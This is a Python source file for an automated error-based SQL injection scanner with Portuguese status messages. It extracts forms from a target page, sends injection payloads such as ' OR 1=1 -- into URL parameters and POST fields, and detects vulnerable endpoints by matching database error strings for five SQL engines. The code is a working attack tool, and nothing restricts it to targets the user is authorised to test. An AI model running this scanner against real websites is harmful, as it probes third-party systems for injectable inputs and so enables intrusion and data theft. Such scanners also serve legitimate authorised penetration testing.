import requests
import re
from urllib.parse import urlparse, urljoin, parse_qs, urlencode

def clean_hostname(target):
    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        parsed = urlparse(f'https://{target}')
    else:
        parsed = urlparse(target)
    
    hostname = parsed.hostname
    if not hostname:
        hostname = target.split('/')[0].split(':')[0]
    return hostname

DB_ERRORS = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql_",
        "mysql_fetch_array",
        "mysql_num_rows",
        "mysql_query"
    ],
    "PostgreSQL": [
        "postgresql query failed",
        "warning: pg_",
        "pg_exec()",
        "severity: error"
    ],
    "Oracle": [
        "ora-01756",
        "oracle error",
        "quoted string not properly terminated"
    ],
    "Microsoft SQL Server": [
        "unclosed quotation mark",
        "microsoft ole db provider for sql server",
        "sql server driver",
        "warning: mssql_"
    ],
    "SQLite": [
        "sqlite3.operationalerror",
        "sqlite3.databaseerror",
        "near \"",
        "unrecognized token:",
        "syntax error"
    ]
}

SQLI_PAYLOADS = ["'", "\"", "' OR 1=1 --", "\" OR 1=1 --", "' OR '1'='1", "\" OR \"1\"=\"1"]

def extract_forms(url, html_content):
    forms = []
    form_matches = re.findall(r'<form[^>]*>(.*?)</form>', html_content, re.IGNORECASE | re.DOTALL)
    form_tags = re.findall(r'<form([^>]*)>', html_content, re.IGNORECASE)
    
    for idx, form_body in enumerate(form_matches):
        tag_attrs = form_tags[idx] if idx < len(form_tags) else ""
        
        action_match = re.search(r'action=["\']([^"\']*)["\']', tag_attrs, re.IGNORECASE)
        method_match = re.search(r'method=["\'](post|get)["\']', tag_attrs, re.IGNORECASE)
        
        action = action_match.group(1) if action_match else ""
        method = method_match.group(1).upper() if method_match else "GET"
        
        input_names = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form_body, re.IGNORECASE)
        textarea_names = re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\']', form_body, re.IGNORECASE)
        
        inputs = list(set(input_names + textarea_names))
        
        forms.append({
            "action": urljoin(url, action),
            "method": method,
            "inputs": inputs
        })
    return forms

def check_db_errors(html_response):
    html_lower = html_response.lower()
    for db_name, errors in DB_ERRORS.items():
        for error in errors:
            if error in html_lower:
                return db_name, error
    return None, None

def scan_url_parameters(url):
    results = []
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    
    if not query_params:
        return results
        
    for param in query_params.keys():
        for payload in SQLI_PAYLOADS:
            test_params = query_params.copy()
            test_params[param] = [payload]
            
            test_query = urlencode(test_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
            
            try:
                response = requests.get(test_url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
                db_name, error_str = check_db_errors(response.text)
                
                if db_name:
                    results.append({
                        "type": "GET",
                        "parameter": param,
                        "payload": payload,
                        "url_tested": test_url,
                        "vulnerability_type": "Error-based SQL Injection",
                        "db_engine": db_name,
                        "error_signature": error_str
                    })
                    break
            except requests.RequestException:
                pass
    return results

def scan_forms_post(url, forms):
    results = []
    for form in forms:
        if form["method"] != "POST" or not form["inputs"]:
            continue
            
        for param in form["inputs"]:
            for payload in SQLI_PAYLOADS:
                data = {}
                for inp in form["inputs"]:
                    data[inp] = payload if inp == param else "test"
                    
                try:
                    response = requests.post(form["action"], data=data, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
                    db_name, error_str = check_db_errors(response.text)
                    
                    if db_name:
                        results.append({
                            "type": "POST",
                            "action": form["action"],
                            "parameter": param,
                            "payload": payload,
                            "vulnerability_type": "Error-based SQL Injection (Form)",
                            "db_engine": db_name,
                            "error_signature": error_str
                        })
                        break
                except requests.RequestException:
                    pass
    return results

def run_sqli_scan(target_url):
    print(f"* Iniciando varredura SQL Injection para {target_url}...")
    
    scan_results = {
        "target_url": target_url,
        "is_vulnerable": False,
        "forms_found": [],
        "vulnerabilities": []
    }
    
    try:
        response = requests.get(target_url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        html_content = response.text
        
        forms = extract_forms(target_url, html_content)
        scan_results["forms_found"] = forms
        
        get_vulns = scan_url_parameters(target_url)
        post_vulns = scan_forms_post(target_url, forms)
        
        scan_results["vulnerabilities"] = get_vulns + post_vulns
        scan_results["is_vulnerable"] = len(scan_results["vulnerabilities"]) > 0
        
    except Exception as e:
        scan_results["error"] = str(e)
        
    return scan_results
